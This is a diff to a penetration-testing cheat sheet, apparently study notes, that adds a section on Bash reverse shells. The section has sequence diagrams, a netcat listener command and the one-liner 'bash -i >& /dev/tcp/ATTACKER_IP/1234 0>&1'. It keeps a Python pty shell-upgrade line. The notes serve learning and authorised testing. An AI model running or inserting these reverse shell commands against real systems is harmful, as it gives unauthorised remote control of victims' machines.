@@ -101,10 +101,62 @@ msf6> search nibble
 
 ## [REVERSE SHELL](https://www.imperva.com/learn/application-security/reverse-shell/)
 
-Method: `Python pty module`
+### Bash-Based Reverse Shells
+
+```mermaid
+sequenceDiagram
+
+    participant A as Attacker
+    participant T as Target
+
+    A->>A: nc -lvp 1234
+    Note right of A: Listening on port 1234
+
+    T->>A: Outbound TCP Connection
+    A->>T: Connection Accepted
+
+    A->>T: whoami
+    T->>T: Execute Command
+    T->>A: username
+
+    A->>T: pwd
+    T->>T: Execute Command
+    T->>A: Current Directory
+
+    loop Interactive Session
+        A->>T: Command
+        T->>A: Output
+    end
+```
+
+Attacker side:
+```bash
+nc -lvp 1234
+```
+> to wait for a reverse-shell connection from another machine.
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
+```
+> When the victim executes that command, a shell connects back to the Netcat listener.
+```mermaid
+sequenceDiagram
+
+    participant Remote as Remote Listener
+    participant Bash as Bash Shell
+
+    Remote->>Bash: Command
+    Bash->>Bash: Execute
+
+    Bash->>Remote: Standard Output
+    Bash->>Remote: Error Output
+```
+
+### Python Reverse Shells | `Python pty module`
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```
+
 ## [BURP SUITE](https://www.kali.org/tools/burpsuite/)
 
 ```bash
